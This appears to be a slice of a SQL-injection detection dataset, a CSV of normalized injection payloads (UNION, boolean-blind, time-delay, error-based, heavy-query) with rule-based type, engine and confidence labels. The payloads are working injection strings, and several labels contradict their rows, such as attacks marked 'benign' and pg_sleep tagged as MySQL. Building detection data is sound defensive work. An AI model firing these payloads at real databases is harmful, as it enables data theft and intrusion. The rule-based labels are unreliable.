row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3930,1'+ ( select 'rajp' where 3300 = 3300,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3931,"1%' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3932,"1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""thkh"" like ""thkh",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3933,"1 ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
3934,-1760 ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 1541 = 1541,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
3935,"-5819%"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""%"" = """,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
3936,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) ||'",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3937,"1"" where 3692 = 3692 union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3938,1 ) ) as uqsi where 1644 = 1644 and 9198 = 9198--,1,,boolean_blind,generic,0.95,1644 = 1644 and detected — boolean_blind injection (priority 8) on generic,rule-based
3939,"-2423' ) ) ) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3940,select ( case when ( 2717 = 2634 ) then 2717 else 2717* ( select 2717 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3941,"-5539"" ) union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3942,1%' ) ) and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3943,"-3790"" ) as ojgb where 5925 = 5925 union all select 5925,5925#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3944,1' ) where 2090 = 2090,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3945,1' and 1661 = 1244 and 'dcha' = 'dcha,1,,boolean_blind,generic,0.95,1661 = 1244 and detected — boolean_blind injection (priority 8) on generic,rule-based
3946,"-1372%' ) ) ) union all select 8403,8403,8403,8403#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3947,1 where 9774 = 9774,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3948,1 ) ) and 3249 = 2985,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3949,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3950,"1' ) as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",1,,boolean_blind,generic,0.95,6184 = 6184 and detected — boolean_blind injection (priority 8) on generic,rule-based
3951,"1 ) ) as jfae where 6684 = 6684 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
3952,"1 ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
3953,"1' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3954,"1"" ) ) as tmpz where 7224 = 7224 and make_set ( 3579 = 1045,1045 ) --",1,,boolean_blind,generic,0.95,7224 = 7224 and detected — boolean_blind injection (priority 8) on generic,rule-based
3955,"-1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,1181 = 1181 or detected — boolean_blind injection (priority 8) on generic,rule-based
3956,"1"" where 1132 = 1132 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3957,1' where 1153 = 1153 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3958,"1'|| ( select 'hrpa' where 1973 = 1973 union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3959,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'rgue' like 'rgue",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
